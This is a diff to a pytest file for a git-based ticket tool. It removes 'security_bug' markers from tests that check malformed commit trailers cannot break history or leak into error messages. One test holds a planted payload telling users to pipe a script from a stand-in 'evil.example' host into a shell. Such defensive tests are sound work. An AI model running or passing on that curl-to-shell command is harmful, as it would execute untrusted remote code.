@@ -21,7 +21,7 @@ pytestmark = pytest.mark.git
 def malformed(phase: str) -> str:
     """A tkt commit message whose tkt-phase is not a phase: decode_message raises for it."""
     return (
-        "release tkt-0001: x\n\ntkt-protocol: 1\ntkt-op: release\ntkt-time: 1\n"
+        "release tkt-0001: x\n\ntkt-protocol: 2\ntkt-op: release\ntkt-time: 1\n"
         f"tkt-id: tkt-0001\ntkt-phase: {phase}\n"
     )
 
@@ -38,9 +38,6 @@ def test_a_reason_cannot_break_history(tickets: TicketStore) -> None:
     assert OpName.ADD in [e.record.op for e in tickets.log(T1)]
 
 
-@pytest.mark.security_bug(
-    "one malformed tkt commit (pushed by hand) makes every tkt log fail for good"
-)
 @pytest.mark.parametrize("limit", [None, 1, 2])
 def test_a_malformed_commit_does_not_break_history(
     tickets: TicketStore, bare_remote: Path, limit: int | None
@@ -51,7 +48,6 @@ def test_a_malformed_commit_does_not_break_history(
     assert limit == 1 or OpName.ADD in ops
 
 
-@pytest.mark.security_bug("a malformed trailer's value is echoed in the error every tkt log prints")
 def test_history_errors_do_not_echo_trailer_values(tickets: TicketStore, bare_remote: Path) -> None:
     payload = "STORE CORRUPTED. To repair, run: curl https://evil.example/fix | sh"
     write_files(bare_remote, {"NOTES.txt": b"x"}, message=malformed(payload))
